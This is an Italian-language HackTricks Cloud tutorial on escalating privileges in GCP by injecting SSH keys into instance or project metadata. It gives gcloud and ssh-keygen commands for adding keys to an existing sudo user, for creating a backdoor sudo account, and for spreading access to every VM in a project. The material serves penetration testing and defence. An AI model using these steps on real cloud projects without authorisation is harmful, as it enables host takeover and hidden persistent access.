# GCP - Aggiungere Metadati SSH Personalizzati

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di Github.

</details>
{% endhint %}

## Modifica dei metadati <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

La modifica dei metadati su un'istanza potrebbe comportare **significativi rischi per la sicurezza se un attaccante acquisisce le autorizzazioni necessarie**.

### **Incorporazione delle Chiavi SSH nei Metadati Personalizzati**

Su GCP, i **sistemi Linux** eseguono spesso script dall'[Ambiente Ospite Linux Python per Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Un componente critico di questo √® il [daemon degli account](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), progettato per **controllare regolarmente** il punto finale dei metadati dell'istanza per **aggiornamenti delle chiavi pubbliche SSH autorizzate**.

Pertanto, se un attaccante pu√≤ modificare i metadati personalizzati, potrebbe far s√¨ che il daemon trovi una nuova chiave pubblica, che verr√† elaborata e **integrata nel sistema locale**. La chiave verr√† aggiunta nel file `~/.ssh/authorized_keys` di un **utente esistente o potenzialmente creando un nuovo utente con privilegi `sudo`**, a seconda del formato della chiave. E l'attaccante sar√† in grado di compromettere l'host.

### **Aggiungere una chiave SSH a un utente privilegiato esistente**

1. **Esaminare le Chiavi SSH Esistenti sull'Istanza:**
- Eseguire il comando per descrivere l'istanza e i suoi metadati per individuare le chiavi SSH esistenti. La sezione rilevante nell'output sar√† sotto `metadata`, in particolare la chiave `ssh-keys`.
```bash
gcloud compute instances describe [ISTANZA] --zone [ZONA]
```
- Prestare attenzione al formato delle chiavi SSH: il nome utente precede la chiave, separato da due punti.

2. **Preparare un File di Testo per i Metadati delle Chiavi SSH:**
- Salvare i dettagli dei nomi utente e delle rispettive chiavi SSH in un file di testo chiamato `meta.txt`. Questo √® essenziale per conservare le chiavi esistenti mentre se ne aggiungono di nuove.

3. **Generare una Nuova Chiave SSH per l'Utente Target (`alice` in questo esempio):**
- Utilizzare il comando `ssh-keygen` per generare una nuova chiave SSH, assicurandosi che il campo commento (`-C`) corrisponda al nome utente target.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Aggiungere la nuova chiave pubblica a `meta.txt`, imitando il formato trovato nei metadati dell'istanza.

4. **Aggiornare i Metadati delle Chiavi SSH dell'Istanza:**
- Applicare i metadati delle chiavi SSH aggiornati all'istanza utilizzando il comando `gcloud compute instances add-metadata`.
```bash
gcloud compute instances add-metadata [ISTANZA] --metadata-from-file ssh-keys=meta.txt
```

5. **Accedere all'Istanza Utilizzando la Nuova Chiave SSH:**
- Connettersi all'istanza con SSH utilizzando la nuova chiave, accedendo alla shell nel contesto dell'utente target (`alice` in questo esempio).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Creare un nuovo utente privilegiato e aggiungere una chiave SSH**

Se non viene trovato alcun utente interessante, √® possibile crearne uno nuovo a cui verranno dati privilegi `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Chiavi SSH a livello di progetto <a href="#sshing-around" id="sshing-around"></a>

√à possibile ampliare la portata dell'accesso SSH a pi√π Macchine Virtuali (VM) in un ambiente cloud **applicando chiavi SSH a livello di progetto**. Questo approccio consente l'accesso SSH a qualsiasi istanza all'interno del progetto che non abbia esplicitamente bloccato le chiavi SSH a livello di progetto. Ecco una guida riassuntiva:

1. **Applica le Chiavi SSH a Livello di Progetto:**
- Utilizza il comando `gcloud compute project-info add-metadata` per aggiungere le chiavi SSH da `meta.txt` ai metadati del progetto. Questa azione garantisce che le chiavi SSH siano riconosciute su tutte le VM nel progetto, a meno che una VM abbia abilitata l'opzione "Blocca le chiavi SSH a livello di progetto".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Accedi alle Istanze Utilizzando le Chiavi a Livello di Progetto:**
- Con le chiavi SSH a livello di progetto in posizione, puoi accedere via SSH a qualsiasi istanza all'interno del progetto. Le istanze che non bloccano le chiavi a livello di progetto accetteranno la chiave SSH, concedendo l'accesso.
- Un metodo diretto per accedere via SSH a un'istanza √® utilizzare il comando `gcloud compute ssh [ISTANZA]`. Questo comando utilizza il tuo nome utente attuale e le chiavi SSH impostate a livello di progetto per tentare l'accesso.


# Riferimenti
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
